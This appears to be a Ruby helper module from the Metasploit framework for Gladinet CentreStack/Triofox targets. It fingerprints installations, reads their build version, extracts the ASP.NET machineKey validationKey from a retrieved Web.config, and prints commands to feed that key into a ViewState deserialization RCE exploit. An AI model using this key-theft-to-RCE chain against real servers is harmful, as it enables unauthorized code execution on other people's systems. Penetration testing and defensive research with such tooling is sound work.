# -*- coding: binary -*-

##
# This module provides shared functionality for Gladinet CentreStack/Triofox modules
##
module Msf
  ##
  # Module for shared Gladinet CentreStack/Triofox functionality
  ##
  module Auxiliary::Gladinet
    # Default path to Web.config on Gladinet installations
    DEFAULT_WEB_CONFIG_PATH = 'Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config'.freeze

    # Exploit module for ViewState deserialization RCE
    EXPLOIT_MODULE = 'exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406'.freeze

    # Extract machineKey validationKey from Web.config content
    #
    # @param content [String] The content of the Web.config file
    # @return [String, nil] The validationKey in hex format, or nil if not found
    def extract_machinekey(content)
      return nil unless content

      # Extract machineKey from Web.config
      # Pattern: <machineKey decryptionKey="..." validationKey="..." />
      # NOTE: The exploit module only needs the validationKey, not the decryptionKey
      machinekey_match = content.match(/<machineKey[^>]*decryptionKey=["']([^"']+)["'][^>]*validationKey=["']([^"']+)["']/i)
      return nil unless machinekey_match

      validation_key = machinekey_match[2]

      # Return only validationKey (hex format) as required by the exploit module
      validation_key
    end

    # Check if content contains a machineKey
    #
    # @param content [String] The content to check
    # @return [Boolean] True if machineKey is found
    def contains_machinekey?(content)
      !extract_machinekey(content).nil?
    end

    # Extract and save machineKey, then display instructions for RCE exploit
    #
    # @param content [String] The content of the Web.config file
    # @param filepath [String] The file path that was read
    # @param loot_description [String] Description for the loot file
    def handle_machinekey_extraction(content, filepath, loot_description = 'MachineKey extracted from Gladinet Web.config')
      return unless content.include?('machineKey') || filepath.include?('Web.config')

      machinekey = extract_machinekey(content)
      return print_warning('Could not extract machineKey from Web.config') unless machinekey

      print_good('Extracted machineKey from Web.config')
      print_line("MachineKey: #{machinekey}")
      print_line
      print_good("For RCE: use #{EXPLOIT_MODULE}")
      print_status('Set the MACHINEKEY option in the exploit module:')
      print_line("use #{EXPLOIT_MODULE}")
      print_line("set MACHINEKEY #{machinekey}")

      key_path = store_loot(
        'gladinet.machinekey',
        'text/plain',
        datastore['RHOST'],
        machinekey,
        'machinekey.txt',
        loot_description
      )
      print_good("MachineKey saved to: #{key_path}")
    end

    # Check if target is a Gladinet CentreStack/Triofox installation
    #
    # @param response [Rex::Proto::Http::Response] HTTP response from login page
    # @return [Boolean] True if target appears to be Gladinet
    def gladinet?(response)
      return false unless response&.code == 200

      # Check for Gladinet-specific cookies (strong indicator)
      cookies = response.get_cookies || ''
      has_glad_cookies = cookies.include?('y-glad-state=') || cookies.include?('y-glad-lsid=') || cookies.include?('y-glad-token=')

      # Check for ViewState generator in body (required for ASP.NET ViewState)
      has_viewstate = response.body.include?('id="__VIEWSTATEGENERATOR"')

      # Check for Gladinet branding in body
      has_gladinet_branding = response.body.include?('CentreStack') || response.body.include?('Triofox') || response.body.include?('GLADINET')

      # At least one strong indicator (cookies or ViewState + branding)
      (has_glad_cookies) || (has_viewstate && has_gladinet_branding)
    end

    # Detect the application type from response body
    #
    # @param body [String] HTTP response body
    # @return [String] Application type: 'CentreStack', 'Triofox', or 'Unknown'
    def detect_app_type(body)
      return 'CentreStack' if body.include?('CentreStack')
      return 'Triofox' if body.include?('Triofox')

      'Unknown'
    end

    # Extract build version from response body
    #
    # @param body [String] HTTP response body
    # @return [String, nil] Build version string or nil if not found
    def extract_build_version(body)
      build = body.match(/\(Build\s*.*\)/)
      return nil if build.nil?

      build[0].gsub(/[[:space:]]/, '').split('Build')[1].chomp(')')
    end

    # Send a GET request to the Gladinet login page and extract version
    #
    # @return [String, nil] Build version string or nil if not found
    def gladinet_version
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'portal', 'loginpage.aspx')
      })
      return nil unless res&.code == 200 && gladinet?(res)

      extract_build_version(res.body)
    end
  end
end
